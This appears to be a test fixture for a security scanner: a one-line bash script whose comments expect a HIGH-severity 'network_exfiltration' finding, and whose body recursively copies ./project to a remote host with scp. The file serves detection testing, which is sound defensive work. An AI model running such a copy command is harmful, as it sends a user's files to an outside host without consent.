#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: network_exfiltration
scp -r ./project user@203.0.113.5:/tmp/
